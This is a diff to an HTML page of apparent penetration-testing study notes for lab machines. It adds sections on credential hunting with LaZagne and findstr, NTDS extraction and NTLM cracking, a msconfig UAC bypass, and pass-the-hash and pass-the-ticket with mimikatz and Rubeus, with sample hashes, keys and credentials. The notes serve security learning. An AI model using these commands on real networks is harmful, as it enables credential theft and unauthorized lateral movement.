@@ -150,6 +150,16 @@ set LPORT 9999</code></pre>
                 </div>
 
                 <div class="notion-body">
+                    <h2 id="Credential hunting">Credential hunting</h2>
+                    <ul>    
+                        <p>Once we gained access to a computer/domain we can perform credential huntgin by using <b>LaZagne</b></p>
+                        <pre><code class="language-powershell">.\LaZagne.exe all</code></pre>
+                        <p>Also we can use findstr to discover some filetypes</p>
+                        <pre><code class="language-powershell">findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></pre>
+                    </ul>
+                </div>
+
+                <div class="notion-body">
                     <h2 id="Extracting SAM">Extracting SAM</h2>
                     <ul>
                         <p>In case you found that you have enough privilege to extract config files from Windows like SAM, SYSTEM or SECURITY you could do so by doing...</p>
@@ -199,7 +209,7 @@ mimikatz # sekurlsa::credman  </code></pre>
                         <pre><code class="language-powershell">cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\</code></pre>
                         <p>Transfer the file and crackit using </p>
                         <pre><code class="language-powershell">secretsdump.py -ntds ntds.dit -system system.save LOCAL</code></pre>
-                        <p>Crack the hash by using -m 1000 in hashcat (NTLM)</p>
+                        <p>Crack the hash by using <b>-m 1000</b> in hashcat (NTLM)</p>
                         <p>Other methods more easier</p>
                         <pre><code class="language-powershell">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</code></pre>
                     
@@ -217,6 +227,52 @@ mimikatz # sekurlsa::credman  </code></pre>
                     </ul>
                 </div>
 
+                <div class="notion-body">
+                    <h2 id="Bypassing UAC">Bypassing UAC</h2>
+                    <ul>
+                        <p>In case you would like to escalate privileges and have access to windows UI you could start msconfig and then spawn a terminal by using the tools. This terminal will be an admin terminal</p>
+                    </ul>
+                </div>
+
+
+                <div class="notion-body">
+                    <h2 id="Pass the ticket">Pass the ticket</h2>
+                    <ul>
+                        <p>With the use of mimikatz or rubeus we are able to list all tickets and log in as another users just by using them here i show you how</p>
+                        <h3>Mimikatz</h3>
+                        <ul>
+                           <p>Exporting all tickets</p>
+                           <pre><code class="language-powershell">mimikatz# sekurlsa::tickets /export</code></pre>
+
+                           <p>Extracting kerberos keys (aes256_hmac) y (rc4_hmac_nt) </p>
+                           <pre><code class="language-powershell">mimikatz# sekurlsa::ekeys</code></pre>
+
+                           <h4>Pass the ticket</h4>
+                           <p>Now that we have all the information we need we can use the following command to login as another user</p>
+                           <pre><code class="language-powershell">sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</code></pre>
+                           
+                           <h4>Pass the ticket with powershell</h4>
+                           <p>We can use the ticket to perform pass the ticket using powershell. From mimikatz type</p>
+                           <pre><code class="language-powershell">kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit</code></pre>
+                          <p>Then type</p>  
+                           <pre><code class="language-powershell">powershell
+Enter-PSSession -ComputerName DC01</code></pre>
+                        </ul>
+
+                        <h3>Rubeus</h3>
+                        <ul>
+                           <p>Exporting all tickets</p>
+                           <pre><code class="language-powershell">Rubeus.exe dump /nowrap</code></pre>
+
+                           <p>Pass the ticket</p>
+                           <pre><code class="language-powershell">Rubeus.exe ptt /ticket:nameoftheticket.kirbi</code></pre>
+                           <p>Another way to do so (aes256_hmac)</p>
+                           <pre><code class="language-powershell">Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt</code></pre>
+
+                        </ul>
+                    </ul>
+                </div>
         </div>
     </div>
 </body>
